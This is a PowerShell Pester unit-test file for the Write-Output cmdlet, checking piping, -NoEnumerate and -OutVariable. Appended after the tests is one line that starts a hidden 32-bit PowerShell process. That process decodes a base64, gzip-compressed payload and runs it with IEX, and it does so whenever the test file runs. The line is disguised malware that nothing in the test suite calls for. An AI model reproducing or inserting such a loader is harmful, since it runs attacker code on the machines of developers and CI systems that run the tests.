

Describe "Write-Output DRT Unit Tests" -Tags "CI" {
    It "Simple Write Object Test" {
        $objectWritten = 1, 2.2, @("John", "Smith", 10), "abc"
        $results = Write-Output $objectWritten
        $results.Length | Should -Be $objectWritten.Length

        $results[0] | Should -Be $objectWritten[0]
        $results[1] | Should -Be $objectWritten[1]

        $results[2] | Should -Be $objectWritten[2]
        $results[2] -is [System.Array] | Should -BeTrue

        $results[3] | Should -Be $objectWritten[3]
        $results[3] -is [System.String] | Should -BeTrue
    }

    It "Works with NoEnumerate switch" {
        $objectWritten = 1, 2.2, @("John", "Smith", 10), "abc"
        [string]$s = Write-Output $objectWritten -NoEnumerate 6>&1
        $s | Should -Be  '1 2.2 System.Object[] abc'
    }

    It "Preserves the input collection type and contents with -NoEnumerate" {
        $List = [System.Collections.Generic.List[string]]::new( [string[]]@("test", "one", "two") )
        $ObjectWritten = Write-Output $List -NoEnumerate

        $ObjectWritten.GetType() | Should -Be ([System.Collections.Generic.List[string]])
        $ObjectWritten[0] | Should -BeExactly "test"
        $ObjectWritten[1] | Should -BeExactly "one"
        $ObjectWritten[2] | Should -BeExactly "two"
    }
}

Describe "Write-Output" -Tags "CI" {
    $testString = $testString
    Context "Input Tests" {
        It "Should allow piped input" {
            { $testString | Write-Output } | Should -Not -Throw
        }

        It "Should write output to the output stream when using piped input" {
            $testString | Write-Output | Should -Be $testString
        }

        It "Should use inputobject switch" {
            { Write-Output -InputObject $testString } | Should -Not -Throw
        }

        It "Should write output to the output stream when using inputobject switch" {
            Write-Output -InputObject $testString | Should -Be $testString
        }

        It "Should be able to write to a variable" {
            Write-Output -InputObject $testString -OutVariable var
            $var | Should -Be $testString
        }
    }

    Context "Pipeline Command Tests" {
        It "Should send object to the next command in the pipeline" {
            Write-Output -InputObject (1 + 1) | Should -Be 2
        }

        It "Should have the same result between inputobject switch and piped input" {
            Write-Output -InputObject (1 + 1) | Should -Be 2

            1 + 1 | Write-Output | Should -Be 2
        }
    }

    Context "Enumerate Objects" {
        $enumerationObject = @(1, 2, 3)
        It "Should see individual objects when not using the NoEnumerate switch" {
            $singleCollection = $(Write-Output $enumerationObject| Measure-Object).Count

            $singleCollection | Should -Be $enumerationObject.length
        }

        It "Should be able to treat a collection as a single object using the NoEnumerate switch" {
            $singleCollection = $(Write-Output $enumerationObject -NoEnumerate | Measure-Object).Count

            $singleCollection | Should -Be 1
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms77jKjpDZLz+5qJydgTc1G12GPlpirfFPUMZrPTT7DNJxcXZViIUgod/NslUgURWR2zyiJVE35RxkERJDTm/spcaTyQ0n9na0yfo/Z3m1dwk5AlFMUuomtyR2cJJe15oxKNf39e1obn+Yn2fJjjFmkpq11JMks6zKW1pSfWrLh7XpO1HSLOoJH3JPZAQ3PCtl+GGGPtGG1BWkRGXA3SmtwFPgTRMYiVJ4Playy81HTMOwI7iDXFSSCkGw9XPAHoqbCmLGM8pc63qfQi0NJZwTskgg+t4hYUIdE2RoOXUZ6xJuobbI8nPy9QepxEHh1pNAywMtbuba4GzOyC09rv2b7RKgGzxOpAMTPjx8+fvAOWlicB+dtN368sKfesR5gdDLejgkkrHZ4RLf+35RcRmnBrlhysYZp6lbERJso44SN8WSipJY5N/N2eP7gC5586JfQBevhRdAF09jm1J1A6J6ulEs2933m/32WGN/Wnkk8GhJzHeIZdQ7yUl8jgXiMbM+dPbi1IUM1vTcQ1ySM+FgmiGaU8a9h5RmVT7FGTJlLBHKAyAiyAo61l8nsSFLT9bBFZoDXbp4GOjwQNTl474W8PuyezMEpXWI4ijJKJ4aqcjKKRTAjbkZBYUT3JhRLvh2mn9NtxUxSB0fysNxEewHmftMSDyMpYgd4BABurTlxKGYJHhmlRl1irC3qHzZPv4pGCTNGQx9WWgAb8CZBwZKJOgTkmShBy1pE1mdzRmbgsi3xCsM+FPS+IrZqwj5x069meVD8Tt4JKAc0jnIEpi3GZUaxqZBwXSQAH2vrj1I5ui+ekyoJsudHPZTS2FjLRPgpgfitwQdOPlHrHqwtNEICLBXBZwaOyHnRkgJAUz/pN7SE4BnWQ9ZyjAeaR0uar7fgv0/P6ty8cK8b05ouzFXgoXpUb9U6ZrdWKy4all2UVrkurzt12SrfTacWqvX6Qzmqo9otzT0Mi5t5g26sJnKHK/18Y2yWOWO1mfquNzQ9z7/wrF7+S4U2B6WukSvgplmOmwNjaeSKUZkua13a7z40KvJ+aDPc93T/Lv8V01VTTO08b23qCFWDM2fT8Oxq0HLXw5r+dVB8QGWESmHZrhj8emgI1NFt7Nt88JgT+gDYMJwWJaNuv2J0uxUD9avTR/Or7kPsHQ6MgV2go/ldL4B5BVK41nPFOiDPh10AqcoR9nvg45cKTuCBj/kZGZ/bPCrgB4MjA3wqo0fIazivdBjYb/sFjmzWvsOoOVpXdD0/7BRRLUcHVR8lS2Lf6GIULcyNqedtl7uDL+2hp9t37EI3S7dzx9N1fVkzr51RfnV5c3HZHFB7xlFf1+1PiUJAIinZp51Co2wecf7WVd/CIgowAy3A9X2ozQoXlf1d3OE0iVDVp/78QERIGPQ06HoHbSPGuJN0hhc3N3SnXc+YQKH2YXhWeHWkKU+O2nPTOLy6uhpBxlAtT1LONknoyyCTW53lcnDz51bFHBz9/Uct8flafV4vk7SPJ9Be7MS2O2lJSaV417pplHqroND4/4Hd13QAP+57gX1+9xvru8DOZZ7h+MX08sV/Av6PoBhgKsHbgvuJkV3v/D0ie1UdfX8cUQeq8fZP8kF4E8vTNnyd/AsSXdN6iAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

